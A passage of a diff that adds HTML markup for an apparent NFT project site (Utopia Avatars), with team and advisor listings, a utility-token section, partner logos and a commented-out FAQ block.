+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/advisors/DEEPAK.png"
+                              class="rounded-full object-cover w-20 h-20 lg:w-[67px] lg:h-[67px] "></div>
+                          <div class="text-left px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Deepak Chopra</h5>
+                            <ul class="list-inside gap-3 flex mx-auto justify-start"><a
+                                href="https://twitter.com/deepakchopra?s=11&amp;t=AYBzJxsbvjo6MEeqOx7YVQ"
+                                target="_blank" rel="noreferrer"><svg stroke="currentColor" fill="currentColor"
+                                  stroke-width="0" viewBox="0 0 512 512" class="text-xl text-white" height="1em"
+                                  width="1em" xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
+                                  </path>
+                                </svg></a><a href="https://www.instagram.com/deepakchopra/?hl=en" target="_blank"
+                                rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                                  viewBox="0 0 448 512" class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z">
+                                  </path>
+                                </svg></a></ul>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/advisors/1_MAHA.png"
+                              class="rounded-full object-cover w-20 h-20 lg:w-[67px] lg:h-[67px] "></div>
+                          <div class="text-left px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Maha Abouelenein</h5>
+                            <ul class="list-inside gap-3 flex mx-auto justify-start"><a
+                                href="https://twitter.com/mahagaber" target="_blank" rel="noreferrer"><svg
+                                  stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512"
+                                  class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
+                                  </path>
+                                </svg></a><a href="https://www.instagram.com/mahagaber/?hl=en" target="_blank"
+                                rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                                  viewBox="0 0 448 512" class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z">
+                                  </path>
+                                </svg></a></ul>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/advisors/1_PEPE.png"
+                              class="rounded-full object-cover w-20 h-20 lg:w-[67px] lg:h-[67px] "></div>
+                          <div class="text-left flex items-center px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Pepe Baston</h5>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="md:flex-1 lg:flex-initial">
+                    <div
+                      class="h-full flex md:flex-1 lg:flex-initial md:pl-10 md:pr-2 xl:px-6 2xl:px-10 3xl:px-14 flex-col gap-2 md:gap-0 lg:gap-2 lg:min-w-[390px]  xl:min-w-[auto] "
+                      style="opacity: 1; transform: translateX(0px);">
+                      <h3
+                        class="col-span-1 md:col-span-2 lg:flex-auto text-2xl 2xl:text-4xl font-semibold uppercase mb-3 md:mb-8  2xl:mb-8 text-white ">
+                        Team</h3>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/internal-team/jose_manuel.jpg"
+                              class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] ">
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Jose Manuel Lagos</h5>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/internal-team/1_CHEMI.png"
+                              class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] ">
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Jose Miguel Sanz</h5>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/internal-team/1_BILY.png"
+                              class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] ">
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Alvaro Rodriguez</h5>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><a
+                              href="https://twitter.com/cr0ssETH"><img src="/images/team/internal-team/1_CROSS.png"
+                                class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] "></a>
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6"><a href="https://twitter.com/cr0ssETH">
+                              <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Cross Conklin</h5>
+                            </a></div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><a
+                              href="https://www.instagram.com/taav/?hl=es"><img
+                                src="/images/team/internal-team/1_TAAV.png"
+                                class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] "></a>
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6"><a
+                              href="https://www.instagram.com/taav/?hl=es">
+                              <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Taav Cooperman</h5>
+                            </a></div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/internal-team/nicolas_bishton.jpg"
+                              class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] ">
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Nicolas Bishton</h5>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/internal-team/1_RYAN.png"
+                              class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] ">
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Ryan Ruggeiro</h5>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/internal-team/edu.jpg"
+                              class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] ">
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Eduardo&nbsp;Perez</h5>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/internal-team/rodrigo_majarin.jpeg"
+                              class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] ">
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Rodrigo Majarin</h5>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/internal-team/alec_metzger.jpeg"
+                              class="rounded-full object-cover w-20 h-20 md:w-[60px] md:h-[60px] lg:w-[50px] lg:h-[50px] ">
+                          </div>
+                          <div class="text-left flex items-center px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Alec Metzger</h5>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </section>
+            </div>
+          </div>
+          <div id="utilities" class="relative z-10">
+            <div class="z-0 absolute h-full bg-fixed w-full">
+              <div style="width: 100%; height: 100%;"><video loop="" muted="" autoplay="" playsinline=""
+                  preload="metadata" id="bgvid" class="z-0 absolute h-full bg-fixed w-full undefined">
+                  <source src="https://www.utopia.io/video/Fondo+Web+Roadmap-1.m4v" type="video/mp4">
+                </video></div>
+              <div class="top-0 bottom-0 left-0 right-0 w-full h-full absolute z-20 absolute bg-[#00000073] "></div>
+            </div>
+            <div
+              class="md:h-[100%] lg:h-[750px] xl:h-[822px] 2xl:h-[900px] relative z-10 container-roadmap flex w-full lg:flex-row flex-col">
+              <div
+                class="container-title flex flex-col items-center justify-center  absolute pt-[8%] pb-[2%]  md:pt-[8%] md:pb-[2%]  lg:pt-[6%] lg:pb-[5%] left-0 right-0 z-50"
+                style="background: linear-gradient(rgb(0, 0, 0) 50.19%, rgba(0, 0, 0, 0) 100%);">
+                <div class="flex gap-5 mb-6 mb-0 md:mb-3">
+                  <h2
+                    class=" font-medium  text-white uppercase z-10 text-2xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                    UBT</h2>
+                  <div class="border-r border-white z-50 h-auto"></div>
+                  <h2
+                    class=" font-medium  text-white uppercase z-10 text-2xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                    UTILITY BASED TOKENS</h2>
+                </div>
+                <p class="text-white font-semibold text-xs md:text-2xl">We are here for the long term!</p>
+              </div>
+              <div
+                class="w-full relative transition-all ease-in duration-200 container-utilities opacity-100 lg:flex justify-center lg:flex-nowrap grid grid-cols-2">
+                <div class="container-item relative"><img class="object-cover object-top lg:block hidden"
+                    src="/images/utilities/ganga.png" alt="Ganga">
+                  <div class="container-responsive relative flex w-full h-full justify-center lg:hidden"><img
+                      class="object-cover object-top h-[315px] md:h-full w-full" src="/images/utilities/full/ganga.png"
+                      alt="Ganga"><button
+                      class="mt-10 bg-[#6f5d73] text-white hover:bg-white hover:text-black hover:animate-pulse px-6 py-2 rounded-xl font-semibold absolute bottom-4 z-40"><span
+                        class="uppercase">Ganga</span></button></div>
+                  <div id="blackOverlay-0" class="top-0 bottom-0 left-0 right-0 w-full h-full absolute z-20 absolute"
+                    style="background: linear-gradient(rgba(0, 0, 0, 0) 0%, rgb(0, 0, 0) 100%);"></div>
+                  <div
+                    class="overlay absolute top-0 bottom-0 left-0 z-50 right-0 h-full md:h-full w-full bg-transparent">
+                  </div>
+                  <h4
+                    class="text-white z-40 font-bold text-4xl absolute   text-center w-full uppercase bottom-52 lg:flex justify-center hidden">
+                    Ganga</h4>
+                </div>
+                <div class="container-item relative"><img class="object-cover object-top lg:block hidden"
+                    src="/images/utilities/orlinski.png" alt="Orlinski">
+                  <div class="container-responsive relative flex w-full h-full justify-center lg:hidden"><img
+                      class="object-cover object-top h-[315px] md:h-full w-full"
+                      src="/images/utilities/full/orlinski.png" alt="Orlinski"><button
+                      class="mt-10 bg-[#6f5d73] text-white hover:bg-white hover:text-black hover:animate-pulse px-6 py-2 rounded-xl font-semibold absolute bottom-4 z-40"><span
+                        class="uppercase">Orlinski</span></button></div>
+                  <div id="blackOverlay-1" class="top-0 bottom-0 left-0 right-0 w-full h-full absolute z-20"
+                    style="background: linear-gradient(rgba(0, 0, 0, 0) 0%, rgb(0, 0, 0) 100%);"></div>
+                  <div
+                    class="overlay absolute top-0 bottom-0 left-0 z-50 right-0 h-full md:h-full w-full bg-transparent">
+                  </div>
+                  <h4
+                    class="text-white z-40 font-bold text-4xl absolute   text-center w-full uppercase bottom-52 lg:flex justify-center hidden">
+                    Orlinski</h4>
+                </div>
+                <div class="container-item relative"><img class="object-cover object-top lg:block hidden"
+                    src="/images/utilities/metaverse.png" alt="Metaverse">
+                  <div class="container-responsive relative flex w-full h-full justify-center lg:hidden"><img
+                      class="object-cover object-top h-[315px] md:h-full w-full"
+                      src="/images/utilities/full/metaverse.png" alt="Metaverse"><button
+                      class="mt-10 bg-[#6f5d73] text-white hover:bg-white hover:text-black hover:animate-pulse px-6 py-2 rounded-xl font-semibold absolute bottom-4 z-40"><span
+                        class="uppercase">Metaverse</span></button></div>
+                  <div id="blackOverlay-2" class="top-0 bottom-0 left-0 right-0 w-full h-full absolute z-20 absolute"
+                    style="background: linear-gradient(rgba(0, 0, 0, 0) 0%, rgb(0, 0, 0) 100%);"></div>
+                  <div
+                    class="overlay absolute top-0 bottom-0 left-0 z-50 right-0 h-full md:h-full w-full bg-transparent">
+                  </div>
+                  <h4
+                    class="text-white z-40 font-bold text-4xl absolute   text-center w-full uppercase bottom-52 lg:flex justify-center hidden">
+                    Metaverse</h4>
+                </div>
+                <div class="container-item relative"><img class="object-cover object-top lg:block hidden"
+                    src="/images/utilities/community.png" alt="COMMUNITY">
+                  <div class="container-responsive relative flex w-full h-full justify-center lg:hidden"><img
+                      class="object-cover object-top h-[315px] md:h-full w-full"
+                      src="/images/utilities/full/community.png" alt="COMMUNITY"><button
+                      class="mt-10 bg-[#6f5d73] text-white hover:bg-white hover:text-black hover:animate-pulse px-6 py-2 rounded-xl font-semibold absolute bottom-4 z-40"><span
+                        class="uppercase">COMMUNITY</span></button></div>
+                  <div id="blackOverlay-3" class="top-0 bottom-0 left-0 right-0 w-full h-full absolute z-20 absolute"
+                    style="background: linear-gradient(rgba(0, 0, 0, 0) 0%, rgb(0, 0, 0) 100%);"></div>
+                  <div
+                    class="overlay absolute top-0 bottom-0 left-0 z-50 right-0 h-full md:h-full w-full bg-transparent">
+                  </div>
+                  <h4
+                    class="text-white z-40 font-bold text-4xl absolute   text-center w-full uppercase bottom-52 lg:flex justify-center hidden">
+                    COMMUNITY</h4>
+                </div>
+                <div
+                  class="container-line select-none absolute z-30 bottom-12 md:bottom-0 lg:bottom-[-5.5vw] xl:bottom-[-7.938vw] 2xl:bottom-[-10.938vw] 4xl:bottom-[-210.01px] lg:flex hidden">
+                  <img class="w-full object-cover" src="/images/utilities/line-four-points.svg" alt=""></div>
+              </div>
+              <div
+                class="flex w-full justify-center bullets z-50 gap-2 md:gap-8 items-end lg:absolute bottom-4 lg:bg-transparent lg:py-0 flex bg-[#1A1A1A] md:py-5 py-2">
+                <div
+                  class="item-bullet shadow-2xl rounded-xl flex flex-col justify-center items-center hover:cursor-pointer">
+                  <img class="w-[50px] h-[50px] md:h-[68px] md:w-[68px] " src="/images/utilities/bullets/ganga.png"
+                    alt="">
+                  <p class="uppercase text-sm font-bold text-white title mt-1">GANGA</p>
+                </div>
+                <div
+                  class="item-bullet shadow-2xl rounded-xl flex flex-col justify-center items-center hover:cursor-pointer">
+                  <img class="w-[50px] h-[50px] md:h-[68px] md:w-[68px] " src="/images/utilities/bullets/orlinski.png"
+                    alt="">
+                  <p class="uppercase text-sm font-bold text-white title mt-1">ORLINSKI</p>
+                </div>
+                <div class="hover:cursor-pointer item-bullet flex justify-center flex-col items-center active">
+                  <div
+                    class="flex shadow-2xl rounded-xl flex-col  bg-[#141414] w-[50px] h-[50px] md:h-[68px] md:w-[68px] ">
+                    <img class="p-3" src="/icon/home.svg" alt=""></div>
+                  <p class="uppercase text-sm font-bold text-white title mt-1">Utilities</p>
+                </div>
+                <div
+                  class="item-bullet shadow-2xl rounded-xl flex flex-col justify-center items-center hover:cursor-pointer">
+                  <img class="w-[50px] h-[50px] md:h-[68px] md:w-[68px] " src="/images/utilities/bullets/metaverse.png"
+                    alt="">
+                  <p class="uppercase text-sm font-bold text-white title mt-1">METAVERSE</p>
+                </div>
+                <div
+                  class="item-bullet shadow-2xl rounded-xl flex flex-col justify-center items-center hover:cursor-pointer">
+                  <img class="w-[50px] h-[50px] md:h-[68px] md:w-[68px] " src="/images/utilities/bullets/community.png"
+                    alt="">
+                  <p class="uppercase text-sm font-bold text-white title mt-1">COMMUNITY</p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="partners" class="relative bg-black pt-10 md:pt-12 lg:pt-16 xl:pt-16 2xl:pt-14 z-10">
+            <div class="flex justify-center flex-col py-10 px-4 md:px-10">
+              <div>
+                <div style="opacity: 1; transform: translateX(0px);">
+                  <div class="text-center flex justify-center">
+                    <div class="flex gap-5 mb-6 mb-0 md:mb-8 lg:mb-12">
+                      <h2
+                        class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                        Our</h2>
+                      <div class="border-r border-white z-50 h-auto"></div>
+                      <h2
+                        class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                        Partners</h2>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div>
+                <div style="opacity: 1; transform: translateX(0px);">
+                  <div class="mt-10 flex flex-wrap gap-8 md:gap-8 lg:gap-16 justify-center"><a
+                      href="https://www.hlv.xyz/" target="_blank" rel="noreferrer"><img
+                        class="h-[60px] md:h-[60px] 2xl:h-[75px] flex-1" src="/images/partners/logoHorizenLabs.png"
+                        alt=""></a><a href="https://digitalandsavvy.com/" target="_blank" rel="noreferrer"><img
+                        class="h-[60px] md:h-[60px] 2xl:h-[75px] flex-1" src="/images/partners/DIGITAL SAVVY LOGO.png"
+                        alt=""></a><a href="https://tokenproof.xyz/" target="_blank" rel="noreferrer"><img
+                        class="h-[60px] md:h-[60px] 2xl:h-[75px] flex-1" src="/images/partners/TOKENPROOF LOGO.png"
+                        alt=""></a><a href="https://www.fusion.xyz/" target="_blank" rel="noreferrer"><img
+                        class="h-[60px] md:h-[60px] 2xl:h-[75px] w-[180px] md:w-[250px] flex-1"
+                        src="/images/partners/logo XYZ.svg" alt=""></a><a
+                      href="https://raritysniper.com/nft-drops-calendar" target="_blank" rel="noreferrer"><img
+                        class="h-[60px] md:h-[60px] 2xl:h-[75px] flex-1" src="/images/partners/rarity.png" alt=""></a><a
+                      href="https://www.crossmint.com/" target="_blank" rel="noreferrer"><img
+                        class="w-auto h-[60px] md:h-[60px] 2xl:h-[75px] flex-1" src="/images/partners/crossmint.png"
+                        alt=""></a><a href="https://www.moonpay.com/es" target="_blank" rel="noreferrer"><img
+                        class="h-[60px] md:h-[60px] 2xl:h-[75px] flex-1" src="/images/partners/MoonPay_Logo.png"
+                        alt=""></a></div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!--<div id="faqs" class="relative flex flex-col gap-4 py-16 bg-black pt-8 md:pt-8 lg:pt-8 xl:pt-8 2xl:pt-8 z-10">
+            <div class="text-center flex justify-center mt-0 md:mt-0 lg:mt-5 xl:mt-5">
+              <div>
+                <div style="opacity: 1; transform: translateX(0px);">
+                  <div class="flex gap-5 mb-6 mb-6 md:mb-8 lg:mb-12 justify-center items-center"><img
+                      src="/images/partners/utopia-logo.png" class="h-[65px]" alt="">
+                    <div class="border-r border-white z-50 h-[50px] w-[1px]"></div>
+                    <h2
+                      class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                      FAQs</h2>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="flex flex-col md:flex-row flex-wrap gap-10 md:gap-7 lg:gap-20 px-10 lg:px-20 items-start">
+              <div class="column1 md:pl-5 flex-1">
+                <div>
+                  <div>
+                    <div style="opacity: 1; transform: translateX(0px);">
+                      <h3 class="-ml-5 text-2xl 2xl:text-4xl font-medium mb-2 text-white capitalize">About the project
+                      </h3>
+                    </div>
+                  </div>
+                  <ul class="list-disc">
+                    <div>
+                      <div style="opacity: 1; transform: translateX(0px);">
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">What is
+                            the Utopia Avatars Collection? </span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">Who are
+                            the founders of the Utopia Avatar project?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">What is
+                            the mission?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">What type
+                            of NFTs will be released?</span></li>
+                      </div>
+                    </div>
+                  </ul>
+                  <div>
+                    <div style="opacity: 1; transform: translateX(0px);">
+                      <h3 class="-ml-5 text-2xl 2xl:text-4xl font-medium mb-2 text-white capitalize mt-5">General
+                        questions</h3>
+                    </div>
+                  </div>
+                  <ul class="list-disc">
+                    <div>
+                      <div style="opacity: 1; transform: translateX(0px);">
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">What is
+                            an NFT?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">What is
+                            Blockchain Technology?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">Why are
+                            you embarking on Web3.0 &amp; NFTs?</span></li>
+                      </div>
+                    </div>
+                  </ul>
+                </div>
+              </div>
+              <div class="column2 md:pl-5 flex-1">
+                <div>
+                  <div>
+                    <div style="opacity: 1; transform: translateX(0px);">
+                      <h3 class="-ml-5 text-2xl 2xl:text-4xl font-medium mb-2 text-white capitalize ">About the
+                        collection</h3>
+                    </div>
+                  </div>
+                  <ul class="list-disc">
+                    <div>
+                      <div style="opacity: 1; transform: translateX(0px);">
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">Who is
+                            the artist of this collection?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">When will
+                            the NFTs be available for purchase?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">How many
+                            NFTs will you be releasing?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">How much
+                            do the NFTs cost?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">How does
+                            the Community Treasury transparency works? </span></li>
+                      </div>
+                    </div>
+                  </ul>
+                </div>
+              </div>
+              <div class="column2 md:pl-5 flex-1">
+                <div>
+                  <div>
+                    <div style="opacity: 1; transform: translateX(0px);">
+                      <h3 class="-ml-5 text-2xl 2xl:text-4xl font-medium mb-2 text-white capitalize">About Community
+                        Treasury</h3>
+                    </div>
+                  </div>
+                  <ul class="list-disc">
+                    <div>
+                      <div style="opacity: 1; transform: translateX(0px);">
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">What
+                            specific revenue channels does the 20% allocation include?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">How often
+                            will this revenue be transferred to the Community Treasury?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">What is
+                            the Community Treasury wallet address?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">Will the
+                            Community Treasury hold assets other than USDC?</span></li>
+                        <li class="py-1 text-white"><span class="text-white cursor-pointer hover:text-primary">How does
+                            the Community treasury proposals Works?</span></li>
+                      </div>
+                    </div>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>-->
+        </div>
+      </div>
+    </div>
+  </div>
+
+</body>
+
+</html>
